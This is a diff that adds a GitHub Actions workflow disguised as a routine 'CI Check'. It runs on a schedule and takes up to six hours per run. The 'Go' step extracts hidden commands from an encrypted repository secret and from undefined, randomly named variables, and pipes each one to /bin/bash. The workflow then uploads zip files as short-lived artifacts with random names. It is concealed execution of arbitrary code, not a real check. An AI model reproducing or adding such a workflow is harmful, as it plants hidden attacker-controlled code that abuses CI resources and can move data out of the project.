@@ -1,0 +1,39 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          rbg63: ${{ secrets.rbg63 }}
+        run: |
+          printf '%s' "$rbg63" | jq -r .x9 | /bin/bash
+          echo $iipl5 | jq -r .cj10 | /bin/bash
+          printf '%s' "$txlrw287" | jq -r .dkwb7 | /bin/bash
+          echo $aa09266 | jq -r .fujqo6 | /bin/bash
+          printf '%s' "$tb77" | jq -r .le80132 | /bin/bash
+          printf '%s' "$zya8403" | jq -r .e05453 | /bin/bash
+          echo $u3318 | jq -r .out438 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: xVSr0yPv
+          path: "*.zip"
+          retention-days: 1
